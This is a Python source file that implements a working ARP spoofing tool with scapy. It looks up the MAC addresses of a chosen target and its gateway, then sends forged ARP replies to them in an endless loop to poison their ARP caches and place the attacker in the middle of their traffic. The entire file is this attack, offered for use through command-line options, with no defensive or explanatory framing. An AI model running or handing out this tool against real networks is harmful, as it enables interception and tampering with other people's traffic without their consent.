#python !

import argparse
import time

from scapy.all import *
from scapy.layers.dhcp import *
from scapy.layers.l2 import Ether, ARP


def arp_spoofer(target, source, interface, de, gw):
    """
    This is where we perform the attack.
    :param target:
    :param source:
    :param interface:
    :param de:
    :param gw:
    :return:
    """
    gw_ip_a = conf.route.route()[2]  # Here we find out our default gateway ip addr
    p_who_has = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target))  # Sending an arp req to get a reply of what is the mac addr of target
    p_who_has_gw = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=gw_ip_a))  # Sending an arp req to get a reply of what is the mac addr of gw
    tar_mac = str(p_who_has[0][0][1].hwsrc)  # Prepare a var for the hwsrc in the arp reply to target
    tar_mac_gw = str(p_who_has_gw[0][0][1].hwsrc)  # Prepare a var for the hwsrc in the arp reply to gw
    while(1 == 1):
        time.sleep(float(de))
        p_is_at = sendp(Ether(dst=tar_mac) / ARP(op=2, pdst=target, hwdst=tar_mac, psrc=source), iface=interface)  # Attacking target with 'src "is at" our mac' packet
        if (gw):
            p_is_at_gw = sendp(Ether(dst=tar_mac_gw) / ARP(op=2, pdst=gw_ip_a, hwdst=tar_mac_gw, psrc=target), iface=interface)  # Attacking gw with 'target "is at" our mac' packet

def main():
    """
    Getting the args from the user and passing them to an attacking func
    :return:
    """
    op = argparse.ArgumentParser(description="ARP Spoofer")
    op.add_argument("-i", "--iface", type=str, help = "Interface you wish to use")
    op.add_argument("-s", "--src", type=str, help = "The address you want for the attacker")
    op.add_argument("-d", "--delay", type=float, help = "Delay (in seconds) between messages")
    op.add_argument("-gw", "--gateway", type=bool, help = "should GW be attacked as well")
    op.add_argument("-t", "--target", type=str, required=True, help = "IP of the target")
    args = op.parse_args()

    interface = "eth0"
    if args.iface != None:
        interface = str(args.iface)
    sr = conf.route.route()[2]
    if args.src != None:
        sr = str(args.src)
    de = 0.0
    if args.delay != None:
        de = str(args.delay)
    gatew = False
    if args.gateway != None:
        gatew = bool(args.gateway)
    tar = str(args.target)
    arp_spoofer(tar, sr, interface, de, gatew)  # Here we send the params as args the attacking func

if __name__ == '__main__':
    main()
